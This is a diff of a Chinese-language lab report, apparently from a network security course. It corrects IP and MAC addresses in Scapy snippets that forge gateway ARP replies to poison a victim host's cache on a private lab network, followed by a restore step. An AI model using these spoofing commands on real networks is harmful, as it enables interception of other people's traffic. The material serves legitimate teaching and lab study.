@@ -103,7 +103,7 @@ pip3 install scapy[complete]
 
   ![](img/11.png) 
 
-- 伪造网关的 ARP 响应包，准备发送给受害者主机 172.16.111.108，ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
+- 伪造网关的 ARP 响应包，准备发送给受害者主机 172.16.111.111，ARP 响应的目的 MAC 地址设置为攻击者主机的 MAC 地址
   ```
   arpspoofed=Ether()/ARP(op=2, psrc="172.16.111.1", pdst="172.16.111.111",hwdst="08:00:27:0e:34:8d")
   ``` 
@@ -127,7 +127,7 @@ pip3 install scapy[complete]
 
   - 伪装网关给受害者发送 ARP 响应
   ```
-  restorepkt1 = ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:10:ea:af", pdst="172.16.111.108", hwdst=" 08:00:27:52:c6:b2")
+  restorepkt1 = ARP(op=2, psrc="172.16.111.1", hwsrc="08:00:27:a6:e8:f6", pdst="172.16.111.111", hwdst=" 08:00:27:0e:34:8d")
 
   sendp(restorepkt1, count=100, inter=0.2)
   ```
